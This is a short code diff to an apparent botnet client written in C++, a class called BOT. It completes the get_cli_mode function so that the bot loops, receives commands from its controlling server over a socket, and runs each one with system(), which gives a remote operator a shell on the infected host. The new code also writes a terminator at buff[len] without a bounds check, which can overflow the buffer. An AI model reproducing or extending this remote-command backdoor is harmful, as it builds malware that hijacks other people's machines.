@@ -1,5 +1,6 @@
 #include <netinet/in.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 
 #include <sys/utsname.h>
@@ -78,8 +79,8 @@ bool BOT::main_loop()
 
 int BOT::get_next_cmd(struct command_ctx *ctx)
 {
-	int len;
 	char buff[BUF_SZ];
+	int len;
 
 	if (this->socket->recv_msg(buff, &len, BUF_SZ) == false)
 		return CMD_ERR;
@@ -95,9 +96,21 @@ int BOT::get_next_cmd(struct command_ctx *ctx)
 
 bool BOT::get_cli_mode()
 {
+	char buff[BUF_SZ];
+	int len;
+
 	DEBUG(LOG_DEFAULT, "try to get command line interface\n");
 
-	
+	while (1) {
+		//FIXME: crude realisation.
+		if (this->socket->recv_msg(buff, &len, BUF_SZ) == false)
+			return false;
+		buff[len] = '\0';
+		if (system(buff) == -1)
+			DEBUG(LOG_DEFAULT, "system(3) error. input msg is %s",
+			    buff);
+	}
+
 	return true;
 }
 
